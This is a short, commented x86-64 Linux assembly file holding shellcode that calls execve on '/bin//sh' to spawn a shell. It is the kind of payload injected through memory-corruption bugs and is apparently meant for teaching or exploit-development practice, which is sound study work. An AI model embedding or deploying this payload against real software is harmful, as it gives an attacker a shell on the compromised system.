BITS 64

;execve(const char *filename, char *const argv[], char *const envp[])
  push 59                     ;syscall number for execve on linux_64
  pop rax                     ;syscalls are stored in rax register
  xor rdx, rdx                ;zero out rdx, makes 3rd argument NULL(envp)
  xor rbx, rbx                ;zero out rbx register
  push rdx                    ;push NULL stack
  pop rsi                     ;puts NULL into 2rd argument to execve(argv)
  mov rbx, 0x68732f2f6e69622f ;put '/bin//sh' into rbx register
  push rdx                    ;push NULL string termiator to stack
  push rbx                    ;push filename string to stack
  push rsp                    ;pointer to filename argument
  pop rdi                     ;puts filename pointer into first argument register
  syscall 